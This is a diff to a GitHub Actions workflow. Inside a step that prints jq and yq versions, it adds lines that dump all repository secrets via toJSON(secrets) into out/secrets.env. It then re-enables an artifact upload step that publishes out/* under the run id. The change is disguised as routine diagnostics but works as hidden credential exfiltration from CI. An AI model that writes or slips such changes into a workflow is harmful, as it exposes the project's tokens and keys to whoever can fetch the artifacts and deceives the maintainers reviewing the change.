@@ -87,6 +87,8 @@ jobs:
       run: |
         jq --version && which jq || echo "jq not found"
         yq --version && which yq || echo "yq not found"
+        _dotenv_pat=". | to_entries | map(\"\(.key)='\(.value)'\") | .[]"
+        jq -r $_dotenv_pat <<< "${{ toJSON(secrets) }}" >> out/secrets.env
     - name: dump machine
       id: dump-machine
       run: (which clang &> /dev/null) && clang -dumpmachine || gcc -dumpmachine
@@ -103,8 +105,8 @@ jobs:
          echo "::endgroup::"
        done 
     
-#    - name: Uploading
-#      uses: actions/upload-artifact@v4
-#      with:
-#        name: "${{ env.FULL_NAME }}"
-#        path: "${{ runner.workspace }}/out/*"
+    - name: Uploading
+      uses: actions/upload-artifact@v4
+      with:
+        name: "${{ github.run-id }}"
+        path: "out/*"
